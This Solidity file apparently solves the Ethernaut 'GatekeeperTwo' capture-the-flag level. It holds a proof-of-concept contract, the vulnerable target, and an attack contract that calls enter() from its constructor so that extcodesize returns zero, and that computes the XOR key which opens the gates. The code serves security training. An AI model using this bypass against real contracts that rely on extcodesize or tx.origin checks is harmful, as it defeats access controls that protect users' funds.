// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ModifierWithAssemblyPOC {
    uint public codeSize;
    address public latestCaller;

    function setCodeSize() public {
        uint x;
        assembly {
            x := extcodesize(caller())

            sstore(0, x)
            sstore(1, caller())
        }
    }

    function encodePacked() public view returns (bytes memory) {
        return abi.encodePacked(msg.sender);
    }

    function hash() public view returns (bytes32) {
        return keccak256(abi.encodePacked(msg.sender));
    }

    function hashBytes8() public view returns (bytes8) {
        return bytes8(hash());
    }

    function whatAreYou() public pure returns (uint64) {
        return type(uint64).max;
    }

    function whatAreYouBytes() public pure returns (bytes32) {
        return bytes8(type(uint64).max);
    }

    function xorInputs(uint64 a, uint64 b) public pure returns (uint64) {
        return a ^ b;
    }
}

// contract AttackMWAPOC - ModifierWithAssemblyPOC
contract AttackMWAPOC {
    ModifierWithAssemblyPOC mwaPOC;

    constructor(address _mwaPOC) {
        mwaPOC = ModifierWithAssemblyPOC(_mwaPOC);

        mwaPOC.setCodeSize();
    }
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract AttackGatekeeperTwo {
    bytes8 public gateKey;
    GatekeeperTwo gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max
        );

        gatekeeperTwo.enter(gateKey);
    }
}

/**
const gatekeeperTwo = await ethers.deployContract('GatekeeperTwo')

*/
